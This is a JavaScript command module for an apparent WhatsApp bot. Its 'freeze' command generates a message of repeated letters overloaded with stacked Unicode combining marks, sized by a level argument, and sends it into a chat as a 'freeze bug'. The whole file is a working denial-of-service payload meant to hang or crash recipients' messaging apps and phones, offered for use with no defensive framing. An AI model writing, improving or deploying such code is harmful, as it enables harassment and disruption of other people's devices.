import { getOwnerName } from '../../lib/menuHelper.js';

const COMBINING = '\u0300\u0301\u0302\u0303\u0308\u030A\u030B\u0324\u0325\u0326\u0327\u0328';

function buildFreeze(level = 2) {
  const counts = { 1: 50, 2: 150, 3: 400 };
  const n = counts[level] || 150;
  let payload = '';
  for (let i = 0; i < n; i++) {
    payload += 'F' + COMBINING.repeat(Math.ceil(n / 12));
  }
  return payload;
}

export default {
  name: 'freeze',
  alias: ['freezephone', 'freezeapp', 'freezewa'],
  description: 'Send a freeze bug message',
  category: 'bug',

  async execute(sock, m, args, PREFIX) {
    const jid = m.key.remoteJid;
    const level = Math.min(3, Math.max(1, parseInt(args[0]) || 2));

    try {
      await sock.sendMessage(jid, { react: { text: '❄️', key: m.key } });
      await sock.sendMessage(jid, {
        text: buildFreeze(level)
      }, { quoted: m });
    } catch (err) {
      await sock.sendMessage(jid, {
        text: `❌ Failed to send freeze bug: ${err.message}`
      }, { quoted: m });
    }
  }
};
